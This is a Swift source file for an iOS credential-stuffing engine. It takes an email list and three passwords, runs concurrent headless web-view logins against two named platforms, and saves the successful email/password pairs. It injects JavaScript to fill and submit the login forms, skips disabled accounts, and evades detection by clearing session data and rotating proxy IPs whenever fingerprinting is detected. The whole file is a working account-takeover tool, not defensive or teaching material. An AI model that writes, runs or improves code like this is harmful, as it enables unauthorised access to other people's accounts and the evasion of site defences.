import Foundation
import WebKit
import Observation

/// The core automation engine implementing the 3-Password Vertical Matrix.
///
/// Runs on `@AutomationActor` to completely isolate heavy DOM parsing and
/// TaskGroup orchestration from the SwiftUI `@MainActor` rendering thread.
///
/// The slider value (1–7) directly controls TaskGroup concurrency, with each
/// unit spawning one session per platform (×2 for dual-site), preventing
/// iOS Jetsam memory crashes.
@Observable
@AutomationActor
final class DualFindEngine {

    // MARK: - State

    /// ContiguousArray for zero-copy, cache-line-aligned email access.
    private var activeEmails: ContiguousArray<String> = []
    private(set) var foundLogins: [FoundLogin] = []
    private(set) var disabledEmails: Set<String> = []
    private(set) var isRunning: Bool = false
    private(set) var currentPasswordIndex: Int = 0
    private(set) var completedTests: Int = 0
    private(set) var totalTests: Int = 0

    private let domParser = DOMParserService()
    private let proxyManager = ProxyRotationManager()

    // MARK: - 3-Password Vertical Matrix

    /// Executes the full 3-password matrix across all emails.
    ///
    /// - Pass 1: Test all emails with `passwords[0]`
    /// - Prune any "disabled" emails from the ContiguousArray
    /// - Pass 2: Test surviving emails with `passwords[1]`
    /// - Pass 3: Test surviving emails with `passwords[2]`
    ///
    /// - Parameters:
    ///   - emails: The imported email list.
    ///   - passwords: Exactly 3 passwords to iterate.
    ///   - concurrentLimit: The slider value (1–7) controlling TaskGroup width.
    ///   - onProgress: Callback fired after each session completes.
    func runMatrix(
        emails: [String],
        passwords: [String],
        concurrentLimit: Int,
        onProgress: @Sendable @escaping (Int, Int, SessionOutcome) -> Void
    ) async {
        activeEmails = ContiguousArray(emails)
        foundLogins.removeAll()
        disabledEmails.removeAll()
        completedTests = 0
        totalTests = emails.count * passwords.count * 2 // ×2 for dual-site
        isRunning = true

        defer { isRunning = false }

        for (passIdx, password) in passwords.enumerated() {
            currentPasswordIndex = passIdx

            // Run dual-site TaskGroup for this password
            await withTaskGroup(of: Void.self) { group in
                var activeTaskCount = 0
                var emailIterator = activeEmails.makeIterator()

                while let nextEmail = emailIterator.next() {
                    // Each email spawns 2 tasks (Joe + Ignition)
                    if activeTaskCount >= concurrentLimit * 2 {
                        await group.next()
                        activeTaskCount -= 1
                    }

                    for platform in TargetPlatform.allCases {
                        group.addTask { [weak self] in
                            guard let self else { return }
                            let outcome = await self.executeHeadlessSession(
                                email: nextEmail,
                                password: password,
                                platform: platform
                            )
                            await self.handleOutcome(
                                outcome,
                                email: nextEmail,
                                password: password,
                                platform: platform,
                                onProgress: onProgress
                            )
                        }
                        activeTaskCount += 1
                    }
                }

                // Drain remaining tasks
                await group.waitForAll()
            }

            // Prune disabled emails between password passes
            activeEmails = ContiguousArray(activeEmails.filter { !disabledEmails.contains($0) })
        }
    }

    // MARK: - Headless Session

    /// Creates a nonPersistent WKWebView for a single login attempt.
    /// Uses `WKWebsiteDataStore.nonPersistent()` to guarantee each attempt
    /// is treated as a brand-new incognito window by the target server.
    private func executeHeadlessSession(
        email: String,
        password: String,
        platform: TargetPlatform
    ) async -> SessionOutcome {
        let config = await MainActor.run {
            let cfg = WKWebViewConfiguration()
            cfg.websiteDataStore = .nonPersistent()
            return cfg
        }

        let webView = await MainActor.run {
            WKWebView(frame: .zero, configuration: config)
        }

        do {
            // Navigate to platform login page
            let request = URLRequest(url: platform.baseURL)
            _ = await MainActor.run { webView.load(request) }

            // Wait for page load
            try await Task.sleep(for: .seconds(3))

            // Fill credentials via native JS evaluation
            let fillResult = await MainActor.run {
                Task {
                    let emailJS = Self.buildFillFieldJS(selector: "#email", value: email)
                    _ = try? await webView.evaluateJavaScriptAsync(emailJS)

                    try await Task.sleep(for: .milliseconds(300))

                    let passJS = Self.buildFillFieldJS(selector: "#login-password", value: password)
                    _ = try? await webView.evaluateJavaScriptAsync(passJS)

                    try await Task.sleep(for: .milliseconds(200))

                    let submitJS = "document.querySelector('#login-submit')?.click(); 'CLICKED';"
                    return try? await webView.evaluateJavaScriptAsync(submitJS)
                }
            }
            _ = await fillResult.value

            // Wait for response
            try await Task.sleep(for: .seconds(4))

            // Evaluate DOM state
            let evaluation = await MainActor.run {
                Task { await domParser.evaluateLoginResult(webView: webView) }
            }
            let result = await evaluation.value

            // Handle fingerprint burn
            if result.isFingerprinted {
                await performBurnAndRotate(config: config)
                return .fingerprinted
            }

            return result.outcome

        } catch {
            return .connectionFailure
        }
    }

    // MARK: - Burn & Rotate

    /// Executes the "Burn & Rotate" security protocol:
    /// 1. Clears all session data via `WKWebsiteDataStore.removeData`
    /// 2. Rotates the proxy/VPN IP
    private func performBurnAndRotate(config: WKWebViewConfiguration) async {
        // Clear all website data
        await config.websiteDataStore.removeData(
            ofTypes: WKWebsiteDataStore.allWebsiteDataTypes(),
            modifiedSince: .distantPast
        )

        // Rotate IP
        await proxyManager.rotateTunnelIP(reason: "Fingerprint detected — Burn & Rotate")
    }

    // MARK: - Outcome Handling

    private func handleOutcome(
        _ outcome: SessionOutcome,
        email: String,
        password: String,
        platform: TargetPlatform,
        onProgress: @Sendable @escaping (Int, Int, SessionOutcome) -> Void
    ) {
        completedTests += 1

        switch outcome {
        case .success:
            foundLogins.append(FoundLogin(email: email, password: password, platform: platform))
        case .disabled:
            disabledEmails.insert(email)
        default:
            break
        }

        onProgress(completedTests, totalTests, outcome)
    }

    // MARK: - JS Builders

    private static func buildFillFieldJS(selector: String, value: String) -> String {
        let escaped = value
            .replacingOccurrences(of: "\\", with: "\\\\")
            .replacingOccurrences(of: "'", with: "\\'")
        return """
        (function(){
            var el = document.querySelector('\(selector)');
            if (!el) return 'NOT_FOUND';
            el.focus();
            var nativeSetter = Object.getOwnPropertyDescriptor(
                window.HTMLInputElement.prototype, 'value'
            );
            if (nativeSetter && nativeSetter.set) {
                nativeSetter.set.call(el, '\(escaped)');
            } else {
                el.value = '\(escaped)';
            }
            el.dispatchEvent(new Event('input', {bubbles: true}));
            el.dispatchEvent(new Event('change', {bubbles: true}));
            return 'FILLED';
        })()
        """
    }
}
